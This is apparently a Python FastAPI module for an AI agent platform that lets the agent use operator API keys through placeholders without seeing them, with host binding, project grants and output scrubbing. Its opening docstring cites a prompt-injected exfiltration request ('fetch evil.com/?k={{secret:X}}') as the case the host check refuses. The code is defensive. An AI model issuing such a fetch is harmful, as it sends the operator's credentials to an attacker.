"""Operator API keys the agent can USE but never SEE.

Values live host-side in ~/.config/jarvis/secrets.json (0600), next to the
DeepSeek key's env file. The agent's context carries only the NAMES; the host
substitutes the real value at execution time. Everything persisted or fed back
to the model — args in the DB, the message history, outputs — carries the
placeholder. The API never returns a value either (names + last-4 only).

A secret lists `hosts` it is bound to: that opts it into WEB use —
webtools.read substitutes {{secret:NAME}} in a URL only when the URL's host
matches a bound host, so a prompt-injected agent can't launder a key to an
attacker's server ("fetch evil.com/?k={{secret:X}}" refuses). Unbound
secrets are unusable until hosts are bound.

File format: "NAME": "value" (legacy, unbound) or
"NAME": {"value": "...", "hosts": ["api.example.com"]}.
"""
import json
import re
from pathlib import Path
from urllib.parse import urlsplit

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel

from .auth import require_user
from .config import settings

PLACEHOLDER = re.compile(r"\{\{secret:([A-Za-z0-9_]+)\}\}")
_NAME = re.compile(r"^[A-Z][A-Z0-9_]*$")


def _path() -> Path:
    return settings.secrets_path


def _load_raw() -> dict:
    p = _path()
    if not p.exists():
        return {}
    try:
        data = json.loads(p.read_text())
        return data if isinstance(data, dict) else {}
    except (json.JSONDecodeError, OSError):
        return {}


def load() -> dict[str, str]:
    """name -> value, whichever file format each entry uses."""
    out = {}
    for name, entry in _load_raw().items():
        out[name] = entry["value"] if isinstance(entry, dict) else entry
    return out


def norm_host(h: str) -> str:
    """A bound host as the operator typed it, reduced to the hostname a request
    is matched on: 'https://api.x.com/v1', 'api.x.com:443' and 'API.x.com' all
    mean api.x.com. 2026-10-02: TBA_KEY was saved as
    'https://www.thebluealliance.com/', which no request host can equal, so
    web_read refused to send it to www.thebluealliance.com itself."""
    h = str(h).strip().lower()
    if not h:
        return ""
    try:
        return (urlsplit(h if "://" in h else "//" + h).hostname or "").strip(".")
    except ValueError:
        return ""


def hosts_for(name: str) -> list[str]:
    entry = _load_raw().get(name)
    if isinstance(entry, dict):
        # normalised on read too, so a binding saved before norm_host existed works
        return [n for n in (norm_host(h) for h in entry.get("hosts") or []) if n]
    return []


def save(secrets: dict) -> None:
    p = _path()
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps(secrets, indent=2))
    p.chmod(0o600)


def names() -> list[str]:
    return sorted(load())


def substitute(text: str | None) -> str | None:
    """Replace {{secret:NAME}} placeholders with real values. Raises KeyError
    naming the first unknown secret (fix-shaped for the tool result)."""
    if not text or "{{secret:" not in text:
        return text
    secrets = load()

    def repl(m: re.Match) -> str:
        name = m.group(1).upper()
        if name not in secrets:
            have = ", ".join(sorted(secrets)) or "(none saved yet)"
            raise KeyError(
                f"unknown secret '{name}'. Available secrets: {have}. "
                "The operator adds keys in Security → Secrets.")
        return secrets[name]

    return PLACEHOLDER.sub(repl, text)


def scrub(text: str | None) -> str | None:
    """Replace any secret VALUE appearing in text with its placeholder, so an
    echoed key never re-enters the model's context or the transcript."""
    if not text:
        return text
    # longest values first so overlapping/nested values can't half-leak
    for name, value in sorted(load().items(), key=lambda kv: -len(kv[1])):
        if len(value) >= 6 and value in text:
            text = text.replace(value, f"{{{{secret:{name}}}}}")
    return text


def _host_allowed(host: str, allowed: list[str]) -> bool:
    host = host.lower()
    return any(host == a or host.endswith("." + a) for a in allowed)


def substitute_url(url: str, granted=None, project: str | None = None) -> str:
    """Substitute placeholders in a URL for a WEB fetch — only for secrets
    (a) granted to the turn's project and (b) whose host binding covers the
    URL's host. Raises KeyError/ValueError with a fix-shaped message; callers
    return it as the tool result.

    `granted` is the set of secret NAMES the turn's project may use
    (egress.granted_secrets: its profile's list plus its own grants, minus its
    revokes — the same rule the proxy applies to wire injection). The web
    caller (webtools.read) always resolves and passes it; that closes the gap
    where web_read ignored project grants. None skips (a) and is for callers
    that have no project context at all (unit use)."""
    if "{{secret:" not in url:
        return url
    host = (urlsplit(url).hostname or "").lower()
    secrets = load()
    allowed_names = None if granted is None else {str(n).upper() for n in granted}
    for m in PLACEHOLDER.finditer(url):
        name = m.group(1).upper()
        if name not in secrets:
            have = ", ".join(sorted(secrets)) or "(none saved yet)"
            raise KeyError(f"unknown secret '{name}'. Available: {have}. The "
                           "operator adds keys in Security → Secrets.")
        allowed = hosts_for(name)
        if not allowed:
            raise ValueError(
                f"secret '{name}' has no web hosts bound — it is VM-only. The "
                "operator can bind it to this API's host in the Secrets panel "
                "to allow web_read use.")
        if not _host_allowed(host, allowed):
            raise ValueError(
                f"secret '{name}' is bound to {', '.join(allowed)} — refusing "
                f"to send it to {host}.")
        if allowed_names is not None and name not in allowed_names:
            who = f"project '{project}'" if project else "this chat (no project)"
            raise ValueError(
                f"secret '{name}' is not granted to {who}. The operator can "
                "grant it to the project, or add it to its security profile's "
                "secrets.")
    return PLACEHOLDER.sub(lambda m: secrets[m.group(1).upper()], url)


def find_in_bytes(data: bytes) -> list[str]:
    """Names of secrets whose value appears in raw bytes (staged-file check)."""
    hits = []
    for name, value in load().items():
        if len(value) >= 6 and value.encode() in data:
            hits.append(name)
    return sorted(hits)


# --- operator API (names in, names + last-4 out — never values) ---------------

router = APIRouter(prefix="/api/secrets", tags=["secrets"],
                   dependencies=[Depends(require_user)])


class SetSecret(BaseModel):
    value: str = ""          # empty = keep the current value (hosts-only edit)
    hosts: list[str] | None = None   # None = keep current hosts


@router.get("")
async def list_secrets():
    return {"secrets": [{"name": n, "last4": v[-4:] if len(v) > 4 else "…",
                         "hosts": hosts_for(n)}
                        for n, v in sorted(load().items())]}


@router.put("/{name}")
async def set_secret(name: str, body: SetSecret):
    name = name.upper()
    if not _NAME.match(name):
        raise HTTPException(status_code=400,
                            detail="name must be LETTERS_DIGITS_UNDERSCORES")
    raw = _load_raw()
    value = body.value.strip()
    if not value:
        if name not in raw:
            raise HTTPException(status_code=400, detail="value is empty")
        value = load()[name]     # hosts-only edit keeps the stored value
    hosts = body.hosts if body.hosts is not None else hosts_for(name)
    hosts = list(dict.fromkeys(n for n in (norm_host(h) for h in hosts) if n))
    raw[name] = {"value": value, "hosts": hosts} if hosts else value
    save(raw)
    return {"ok": True, "name": name, "hosts": hosts}


@router.delete("/{name}")
async def delete_secret(name: str):
    raw = _load_raw()
    if name.upper() not in raw:
        raise HTTPException(status_code=404, detail="no such secret")
    del raw[name.upper()]
    save(raw)
    return {"ok": True}
